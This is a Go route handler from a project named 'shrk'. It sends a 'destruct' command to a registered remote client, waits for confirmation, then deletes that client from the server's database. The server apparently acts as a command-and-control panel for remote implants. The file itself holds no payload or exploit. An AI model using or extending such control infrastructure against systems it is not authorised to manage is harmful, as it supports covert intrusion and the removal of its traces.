package routes

import (
	"fmt"
	"net/http"

	"github.com/gofiber/fiber/v2"
	"github.com/ngn13/shrk/server/database"
	"github.com/ngn13/shrk/server/joblist"
	"github.com/ngn13/shrk/server/log"
	"github.com/ngn13/shrk/server/util"
)

func GET_destruct(c *fiber.Ctx) error {
	var (
		client *database.Client
		db     *database.Type
		jobs   *joblist.Type
		job    *joblist.Job
		err    error
	)

	client = c.Locals("client").(*database.Client)
	jobs = c.Locals("joblist").(*joblist.Type)
	db = c.Locals("database").(*database.Type)

	data := util.NewBuffer("-")
	res := util.NewBuffer()

	if job, err = jobs.Add(client.ID, joblist.CMD_DESTRUCT, data, res); err != nil {
		log.Fail("failed to add command run job: %s", err.Error())
		return util.RenderErr(c, "server error", http.StatusInternalServerError)
	}

	defer jobs.Del(job.ID)

	if !job.Wait() {
		log.Debg("command run job timed out for %s", client.ID)
		return util.RenderErr(c, "client timeout", http.StatusGatewayTimeout)
	}

	if res.String() != "success" {
		return util.RenderErr(c, fmt.Sprintf(
			"destruct job failed: %s", res.String(),
		), http.StatusGatewayTimeout)
	}

	if err = db.ClientDel(client.ID); err != nil {
		log.Fail("failed to remove client %s from database: %s", client.ID, err.Error())
		return util.RenderErr(c, "server error", http.StatusInternalServerError)
	}

	return util.Redirect(c, "/")
}
